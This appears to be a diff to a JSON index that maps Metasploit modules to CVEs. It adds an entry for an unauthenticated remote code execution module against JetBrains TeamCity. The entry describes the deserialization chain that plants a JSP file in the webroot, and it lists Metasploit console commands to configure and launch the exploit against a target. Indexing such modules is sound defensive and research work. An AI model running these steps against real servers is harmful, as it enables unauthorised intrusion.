@@ -1,12 +1,12 @@
 {
   "metadata": {
-    "generated_at": "2026-08-27T06:52:00.640962Z",
+    "generated_at": "2026-08-28T08:39:50.577291Z",
     "source": "Metasploit Framework",
     "source_url": "https://github.com/rapid7/metasploit-framework",
-    "total_modules_scanned": 4456,
-    "modules_with_cves": 3091,
-    "total_cves": 3187,
-    "total_module_cve_mappings": 3578
+    "total_modules_scanned": 4457,
+    "modules_with_cves": 3092,
+    "total_cves": 3188,
+    "total_module_cve_mappings": 3579
   },
   "cves": {
     "CVE-1978-1234": {
@@ -40845,6 +40845,46 @@
             "set LHOST <your_ip>",
             "set LPORT <your_port>",
             "set PAYLOAD <payload>",
+            "exploit"
+          ]
+        }
+      ]
+    },
+    "CVE-2026-63077": {
+      "modules": [
+        {
+          "module_path": "exploits/multi/http/jetbrains_teamcity_rce_cve_2026_63077",
+          "name": "JetBrains TeamCity Agent Polling Unauthenticated Remote Code Execution",
+          "description": "This module exploits an unsafe XStream deserialization vulnerability in the JetBrains TeamCity agent polling protocol. An unauthenticated attacker can register a build agent, then submit a crafted error response that causes TeamCity to deserialize an attacker-controlled object graph. The object graph uses FreeMarker and Commons Collections to invoke BasicDataSource.getConnection(). HSQLDB initialization statements then write a one-shot JSPWS file to the TeamCity webroot. Requesting the JSPWS file executes the payload with the privileges of the TeamCity server process, deletes the JSPWS source file, and removes the build agent registered by the module. This vulnerability was patched in TeamCity version 2025.11.7, and version 2026.1.3.",
+          "authors": [
+            "Antoni Tremblay",
+            "sfewer-r7"
+          ],
+          "rank": "Unknown",
+          "platform": [
+            "win",
+            "unix",
+            "linux"
+          ],
+          "targets": [
+            "Java Server Page",
+            "win"
+          ],
+          "privileged": false,
+          "disclosure_date": "2026-07-27",
+          "references": [],
+          "github_url": "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/jetbrains_teamcity_rce_cve_2026_63077.rb",
+          "raw_url": "https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/jetbrains_teamcity_rce_cve_2026_63077.rb",
+          "usage_commands": [
+            "use exploits/multi/http/jetbrains_teamcity_rce_cve_2026_63077",
+            "show options",
+            "show targets",
+            "set RHOSTS <target>",
+            "set RPORT <port>",
+            "set LHOST <your_ip>",
+            "set LPORT <your_port>",
+            "set PAYLOAD <payload>",
+            "set TARGET <target_index>",
             "exploit"
           ]
         }
